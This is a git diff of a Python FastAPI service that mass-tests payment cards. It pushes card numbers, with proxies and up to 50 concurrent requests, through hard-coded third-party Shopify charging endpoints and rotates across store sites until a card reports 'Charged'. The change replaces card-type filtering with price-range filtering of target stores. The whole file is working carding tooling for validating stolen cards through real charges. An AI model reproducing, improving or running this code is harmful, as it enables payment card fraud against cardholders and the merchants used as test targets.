@@ -14,33 +14,31 @@ SHOPIFY_APIS = {
     "api2": {"url": "https://shimmering-celebration-production-7dd0.up.railway.app/shopify", "key": "AnonShopii2026!"},
 }
 
-# Load sites from JSON file
-SITES_FILE = os.path.join(os.path.dirname(__file__), "sites.json")
+# Load sites from sites_price.json
+SITES_FILE = os.path.join(os.path.dirname(__file__), "sites_price.json")
 
 def load_sites():
     try:
         with open(SITES_FILE, "r") as f:
-            return json.load(f)
+            data = json.load(f)
+            # Could be a list or dict with "sites" key
+            if isinstance(data, list):
+                return data
+            elif isinstance(data, dict) and "sites" in data:
+                return data["sites"]
+            return data
     except:
-        return {"sites": ["https://the-butterfly-pig-dev.myshopify.com"], "filters": {}}
+        return [{"url": "https://the-butterfly-pig-dev.myshopify.com", "price": 1.0}]
 
-def get_site_for_card(card, sites_data):
-    """Pick a site based on card type (BIN filter)"""
-    cc = card.split("|")[0].strip()
-    filters = sites_data.get("filters", {})
-    
-    # Detect card type from first digits
-    if cc.startswith("4"):
-        # Visa
-        if cc[1:3] in ["22", "23", "24", "25", "26", "27"]:
-            return filters.get("visa_debit", sites_data.get("sites", []))
-        return filters.get("default", sites_data.get("sites", []))
-    elif cc.startswith("5"):
-        return filters.get("mastercard", sites_data.get("sites", []))
-    elif cc.startswith("3"):
-        return filters.get("amex", sites_data.get("sites", []))
-    
-    return filters.get("default", sites_data.get("sites", []))
+def pick_best_sites(sites, min_price=0.0, max_price=999.0):
+    """Filter sites by price range"""
+    filtered = []
+    for s in sites:
+        url = s.get("url", "")
+        price = float(s.get("price", 0))
+        if url and min_price <= price <= max_price:
+            filtered.append(s)
+    return filtered if filtered else sites
 
 @app.post("/check")
 async def check_cards(data: dict):
@@ -49,9 +47,12 @@ async def check_cards(data: dict):
     proxy = data.get("proxy", "")
     api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
     concurrency = data.get("concurrency", 50)
+    min_price = data.get("min_price", 0.0)
+    max_price = data.get("max_price", 999.0)
     
     api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
-    sites_data = load_sites()
+    all_sites = load_sites()
+    available_sites = pick_best_sites(all_sites, min_price, max_price)
     
     results = []
     checked = 0
@@ -61,7 +62,7 @@ async def check_cards(data: dict):
     
     queue = asyncio.Queue()
     for card in cards:
-        queue.put_nowait({"card": card, "site": site})
+        queue.put_nowait(card)
     
     semaphore = asyncio.Semaphore(concurrency)
     
@@ -71,13 +72,12 @@ async def check_cards(data: dict):
         async with aiohttp.ClientSession(timeout=timeout) as session:
             while not queue.empty():
                 try:
-                    item = queue.get_nowait()
+                    card = queue.get_nowait()
                 except asyncio.QueueEmpty:
                     break
-                card = item["card"]
                 
                 async with semaphore:
-                    result = await check_card_forever(session, api, card, sites_data)
+                    result = await check_card_forever(session, api, card, available_sites)
                     results.append(result)
                     checked += 1
                     if result["status"] == "Charged":
@@ -103,21 +103,16 @@ async def check_cards(data: dict):
         "api_used": api_name
     }
 
-async def check_card_forever(session, api, card, sites_data):
+async def check_card_forever(session, api, card, sites):
     """Keep trying different sites until we get a VALID response"""
-    
-    # Get filtered sites for this card
-    available_sites = get_site_for_card(card, sites_data)
-    if not available_sites:
-        available_sites = sites_data.get("sites", ["https://the-butterfly-pig-dev.myshopify.com"])
     
     attempt = 0
     site_index = 0
     
     while True:
         attempt += 1
-        # Rotate through sites
-        current_site = available_sites[site_index % len(available_sites)]
+        current = sites[site_index % len(sites)]
+        current_site = current.get("url", current) if isinstance(current, dict) else current
         site_index += 1
         
         try:
@@ -126,14 +121,12 @@ async def check_card_forever(session, api, card, sites_data):
             async with session.get(url) as resp:
                 text = await resp.text()
                 
-                # Try to parse JSON response
                 try:
                     data = json.loads(text)
                     response_text = data.get('Response', text).lower()
                 except:
                     response_text = text.lower()
                 
-                # Check if this is a VALID final response
                 if 'charged' in response_text and 'no_product' not in response_text:
                     return {
                         "card": card,
@@ -175,7 +168,6 @@ async def check_card_forever(session, api, card, sites_data):
                         "attempts": attempt
                     }
                 
-                # NOT valid -> try next site
                 await asyncio.sleep(0.3)
                 continue
         
@@ -200,7 +192,8 @@ def extract_price(text):
 
 @app.get("/health")
 async def health():
-    return {"status": "ok", "apis": list(SHOPIFY_APIS.keys())}
+    sites = load_sites()
+    return {"status": "ok", "apis": list(SHOPIFY_APIS.keys()), "sites_count": len(sites)}
 
 if __name__ == "__main__":
     import uvicorn
